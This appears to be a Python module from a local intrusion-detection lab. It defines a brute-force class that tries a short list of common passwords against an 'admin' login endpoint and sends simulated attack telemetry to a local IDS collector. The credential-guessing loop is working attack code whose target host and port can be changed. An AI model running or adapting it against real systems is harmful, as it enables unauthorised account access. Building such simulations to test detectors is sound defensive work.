"""
For educational use against your own local test environment only.
Brute force simulation: tries a small built-in wordlist against /login.
"""
import time
import json
import random
import threading
import urllib.request
import requests as req
from attacks.attack_base import BaseAttack

_USERNAME = "admin"
_WORDLIST = [
    "password", "123456", "admin", "letmein", "qwerty",
    "abc123", "monkey", "dragon", "master", "12345678",
    "pass", "root", "toor", "test", "password123",
]


# Inheritance
class BruteForceAttack(BaseAttack):
    """Simulates a brute force by trying a wordlist against the /login endpoint."""

    def __init__(self, target: str = "127.0.0.1", port: int = 5000, duration: int = 10) -> None:
        """Initialise brute force attack."""
        super().__init__(target=target, port=port, duration=duration)

    def _report_telemetry(self) -> None:
        """Send flow telemetry to IDS backend with brute force patterns."""
        def _post():
            try:
                # BruteForce pattern: targets SSH/FTP ports (22), many forward packets
                payload = json.dumps({
                    "dst_port": 22,  # SSH port triggers BruteForce detector
                    "src_ip": "127.0.0.1",
                    "src_port": random.randint(40000, 65000),
                    "fwd_pkts": random.randint(15, 50),
                    "bwd_pkts": random.randint(5, 15),
                    "syn": 1,
                    "ack": 1,
                    "pkt_len": 120,
                    "duration_us": random.uniform(3000, 10000),
                    "attack_type": "BruteForce",
                }).encode("utf-8")
                r = urllib.request.Request(
                    "http://127.0.0.1:8000/live/ingest",
                    data=payload,
                    headers={"Content-Type": "application/json"},
                )
                urllib.request.urlopen(r, timeout=0.5)
            except Exception:
                pass
        threading.Thread(target=_post, daemon=True).start()

    # Polymorphism
    def run(self) -> None:
        """Iterate the wordlist, printing each attempt and server response."""
        url = f"http://{self.target}:{self.port}/login"
        print(f"[BruteForce] Targeting {url} as user '{_USERNAME}'")
        print(f"[BruteForce] {len(_WORDLIST)} passwords to try")
        start = time.time()
        deadline = start + self.duration
        attempt = 0

        while time.time() < deadline:
            for pwd in _WORDLIST:
                if time.time() >= deadline:
                    break
                attempt += 1
                try:
                    r = req.post(
                        url,
                        json={"username": _USERNAME, "password": pwd},
                        timeout=3,
                    )
                    self._report_telemetry()
                    status = "[OK] SUCCESS" if r.status_code == 200 else f"[FAIL] {r.status_code}"
                    print(f"  [{attempt:3d}] password='{pwd}' -> {status}")
                    if r.status_code == 200:
                        print(f"[BruteForce] Login succeeded with password: '{pwd}'")
                        return
                except Exception as exc:
                    print(f"  [{attempt:3d}] ERROR: {exc}")
                time.sleep(0.1)  # brief pause between attempts

        print(f"\n[BruteForce] Attack finished after {self.duration}s. {attempt} attempts made.")
